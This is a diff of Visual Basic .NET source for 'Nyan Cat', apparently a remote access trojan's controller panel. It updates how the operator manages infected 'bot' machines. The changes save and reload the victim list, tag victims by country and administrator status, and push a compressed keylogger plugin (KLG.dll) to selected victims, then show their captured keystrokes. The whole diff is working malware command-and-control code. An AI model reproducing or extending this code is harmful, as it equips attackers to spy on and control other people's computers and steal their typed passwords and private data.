@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Sept/22/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/25/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -48,6 +48,21 @@ Public Class Main
         CheckForIllegalCrossThreadCalls = False
         Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+
+        Try
+            Dim BotList() As String = IO.File.ReadAllLines("MISC/USERS.dat")
+            For Each line As String In BotList
+                Dim lineArray() As String = Split(line, "<<#>>")
+                Dim bot = L1.Items.Add(lineArray(0))
+                bot.ForeColor = Color.Red
+                For i As Integer = 1 To lineArray.Length - 1
+                    bot.SubItems.Add(lineArray(i))
+                Next
+            Next
+            L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+        Catch ex As Exception
+        End Try
+
         Try
             S = New S_TcpListener(S_Settings.PORT)
         Catch ex As Exception
@@ -61,6 +76,19 @@ Public Class Main
 
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
         My.Settings.Save()
+
+        Try
+            Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
+            Dim SPL As String = "<<#>>"
+            For Each x As ListViewItem In L1.Items
+                myWriter.WriteLine(x.Text & SPL & x.SubItems(1).Text & SPL & x.SubItems(2).Text & SPL _
+                                   & x.SubItems(3).Text & SPL & x.SubItems(4).Text & SPL & x.SubItems(5).Text & SPL & x.SubItems(6).Text & SPL _
+                                   & x.SubItems(7).Text & SPL & x.SubItems(8).Text & SPL & x.SubItems(9).Text & SPL & x.SubItems(10).Text & SPL & "Offline" & SPL & x.SubItems(12).Text)
+            Next
+            myWriter.Close()
+        Catch ex As Exception
+        End Try
+
         Try
             NotifyIcon1.Dispose()
             Application.Exit()
@@ -228,6 +256,7 @@ Public Class Main
                         For i As Integer = 0 To L1.Items.Count - 1
                             If L1.Items(i).SubItems(ID.Index).Text = A(1) AndAlso L1.Items(i).SubItems(USERN.Index).Text = A(2) Then
                                 L1.Items(i).Tag = u
+                                L1.Items(i).ImageKey = _Gio.LookupCountryCode(S.IP(u)) & ".png"
                                 L1.Items(i).SubItems(IP.Index).Text = S.IP(u)
                                 L1.Items(i).SubItems(ID.Index).Text = A(1)
                                 L1.Items(i).SubItems(USERN.Index).Text = A(2)
@@ -240,7 +269,7 @@ Public Class Main
                                 L1.Items(i).SubItems(SP.Index).Text = A(9)
                                 L1.Items(i).SubItems(PING.Index).Text = "Online"
                                 L1.Items(i).ForeColor = Nothing
-                                L1.Items(i).ToolTipText = String.Format("Privileges {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13))
+                                L1.Items(i).ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13))
                                 Messages("{" + S.IP(u) + "}", "Reconnected")
 
                                 Try
@@ -261,7 +290,7 @@ Public Class Main
 
                         Dim L = L1.Items.Add(_Gio.LookupCountryName(S.IP(u)), _Gio.LookupCountryCode(S.IP(u)) & ".png")
                         L.Tag = u
-                        Try : L.ToolTipText = String.Format("Privileges {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13)) : Catch : End Try
+                        Try : L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13)) : Catch : End Try
                         L.SubItems.Add(S.IP(u))
 
                         For i As Integer = 1 To A.Length - 1
@@ -948,7 +977,7 @@ Public Class Main
                         KL.Show()
                     End If
 
-                    KL.RichTextBox1.Text = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(A(2)))
+                    KL.RichTextBox1.AppendText(A(2).ToString)
                     Exit Select
 
 #End Region
@@ -1746,9 +1775,9 @@ Public Class Main
     Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                Dim KL As File_Manager = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
+                Dim KL As Keylogger = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
                 If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                    S.Send(x.Tag, "KL")
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + " ")
                     x.BackColor = Color.DarkSlateGray
                 End If
             Next
@@ -1843,44 +1872,54 @@ Public Class Main
         End Try
     End Sub
 
+    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
+        About.Show()
+    End Sub
 
-    Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoteToolStripMenuItem.Click
+    Private Sub ClientNoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientNoteToolStripMenuItem.Click
         On Error Resume Next
         Dim note As String = InputBox("Enter note", "", "")
-
         For Each x As ListViewItem In L1.SelectedItems
             STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Note", note)
             x.SubItems(NOTE_.Index).Text = note
         Next
     End Sub
 
-    Private Sub ClientColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientColorToolStripMenuItem.Click
+    Private Sub ClientColorToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientColorToolStripMenuItem1.Click
         On Error Resume Next
 
         Dim cDialog As New ColorDialog
         For Each x As ListViewItem In L1.SelectedItems
-            If (cDialog.ShowDialog() = DialogResult.OK) Then
-                x.ForeColor = cDialog.Color
-                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
-                STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color", CCC)
-            Else
-                DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color")
-                x.ForeColor = Color.FromArgb(142, 188, 0)
+            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                If (cDialog.ShowDialog() = DialogResult.OK) Then
+                    x.ForeColor = cDialog.Color
+                    Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
+                    STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color", CCC)
+                Else
+                    DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color")
+                    x.ForeColor = Color.FromArgb(142, 188, 0)
+                End If
             End If
         Next
     End Sub
 
-    Private Sub ClientFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem.Click
-        Try
-            For Each x As ListViewItem In L1.SelectedItems
+    Private Sub ClientFolderToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem1.Click
+        On Error Resume Next
+        For Each x As ListViewItem In L1.SelectedItems
                 Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
             Next
-        Catch ex As Exception
-        End Try
     End Sub
 
-    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
-        About.Show()
+    Private Sub RemoveOfflineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveOfflineToolStripMenuItem.Click
+        On Error Resume Next
+        For Each x As ListViewItem In L1.Items
+            If x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                x.Remove()
+            End If
+        Next
+        Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
+        myWriter.WriteLine("")
+        myWriter.Close()
     End Sub
 
 
@@ -2162,6 +2201,7 @@ Public Class Main
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
     End Sub
+
 
 
 
